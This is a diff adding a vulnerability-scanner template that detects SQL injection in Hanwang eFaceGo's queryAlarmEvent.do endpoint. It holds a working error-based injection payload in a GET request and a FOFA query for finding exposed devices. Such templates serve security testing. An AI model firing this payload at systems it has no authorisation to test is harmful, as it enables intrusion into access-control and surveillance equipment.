@@ -1,0 +1,32 @@
+id: hanwang-queryAlarmEvent-sqli
+info:
+  name: hanwang queryAlarmEvent.do - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - 
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: icon_hash="1380907357"
+    tips:
+    repair:
+    version:
+  tags: hanwang,efacego,sqli
+
+http:
+  - raw:
+      - |
+        GET /manage/alarm/queryAlarmEvent.do?order=/**/&columnKey=(UPDATEXML(2,CONCAT(0x2e,0x3131313131,(SELECT+(ELT(1=1,1))),0x3131313131),8))&recoToken=ZuZBOrvLG8M HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: queryAlarmEvent.do
+        dsl:
+          - status_code == 200
+          - contains_all(body,'XPATH','SQLException')
+        condition: and
+
